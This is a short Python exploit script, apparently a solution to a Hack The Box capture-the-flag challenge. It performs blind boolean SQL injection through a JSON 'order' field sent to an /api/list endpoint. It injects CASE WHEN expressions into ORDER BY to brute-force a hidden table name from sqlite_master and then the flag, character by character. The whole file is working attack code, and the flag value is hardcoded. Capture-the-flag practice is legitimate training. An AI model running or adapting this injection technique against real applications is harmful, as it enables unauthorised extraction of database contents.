import sys
import requests
import string

url = sys.argv[1] 

flag_tbl = 'flag_490aece6d9'
flag = 'HTB{putt1ng_th3_c0mp3t1on_0ut_0f_0rd3r}'

def log(s):
    print('[*]', s)

def log_yay(s):
    print('[!]', s)

dbg = False
def log_debug(s):
    if dbg:
        print('[dbg]', s)

def sqli_post(s):
    log_debug(s)
    data = {'order': s}
    res = requests.post(f'http://{url}/api/list', json = data)
    return res.json()

def sqli_check(s):
    emojis = sqli_post(f'(CASE WHEN {s} THEN id ELSE count END) ASC')
    return emojis[0]['id'] == 1

def check_prefix_char(tbl, col, prefix, c):
    return sqli_check(f"(SELECT HEX(SUBSTR({col},1,{len(prefix) + 1})) FROM {tbl} WHERE {col} LIKE '{prefix}%' limit 1 offset 0)=HEX('{prefix + c}')")

def brute_chars(tbl, col, prefix, charlist):
    ret = prefix
    kek = True
    log(f'Bruting {prefix}')
    while kek:
        kek = False
        for i in charlist:
            if check_prefix_char(tbl, col, ret, i):
                ret += i
                kek = True
                log(f'Now {ret}')
                break

    return ret
                
flag_tbl = brute_chars('sqlite_master', 'tbl_name', flag_tbl, string.hexdigits)

log_yay(f'flag_tbl: {flag_tbl}')

flag = brute_chars(flag_tbl, 'flag', flag, string.ascii_lowercase + string.digits + '_}')

log_yay(f'flag: {flag}')
